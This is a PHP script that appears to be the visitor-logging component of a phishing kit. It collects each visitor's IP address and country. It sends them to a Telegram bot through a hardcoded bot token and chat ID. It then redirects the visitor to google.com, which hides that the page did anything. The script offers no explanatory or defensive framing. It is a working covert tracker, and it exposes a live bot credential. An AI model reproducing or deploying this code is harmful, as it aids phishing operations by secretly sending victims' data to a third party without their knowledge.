<?php

function GetRealUserIp($default = NULL, $filter_options = 12582912) {
    $HTTP_X_FORWARDED_FOR = isset($_SERVER)? $_SERVER["HTTP_X_FORWARDED_FOR"]:getenv('HTTP_X_FORWARDED_FOR');
    $HTTP_CLIENT_IP = isset($_SERVER)?$_SERVER["HTTP_CLIENT_IP"]:getenv('HTTP_CLIENT_IP');
    $HTTP_CF_CONNECTING_IP = isset($_SERVER)?$_SERVER["HTTP_CF_CONNECTING_IP"]:getenv('HTTP_CF_CONNECTING_IP');
    $REMOTE_ADDR = isset($_SERVER)?$_SERVER["REMOTE_ADDR"]:getenv('REMOTE_ADDR');

    $all_ips = explode(",", "$HTTP_X_FORWARDED_FOR,$HTTP_CLIENT_IP,$HTTP_CF_CONNECTING_IP,$REMOTE_ADDR");
    foreach ($all_ips as $ip) {
        if ($ip = filter_var($ip, FILTER_VALIDATE_IP, $filter_options))
            break;
    }
    return $ip?$ip:$default;
}
$ip = GetRealUserIp();  
$iptolocation = 'http://api.hostip.info/country.php?ip=' . $ip;
$blad = file_get_contents($iptolocation);
$t=time();
$w9t = date("h:i:sa");
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));
$msg = "
----------- ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥----------------->
NEW VISITOR CANADA :  IP : $ip | COUNTRY : $ipdat->geoplugin_countryName .
------------ ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥---------------->";

$token = "5954181079:AAGXC-7gB7cOleXztumWOf59HMFWCQJ9bjE";
$data = [
    'text' => $msg,
    'chat_id' => '5876774871'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("location:https://google.com")

?>

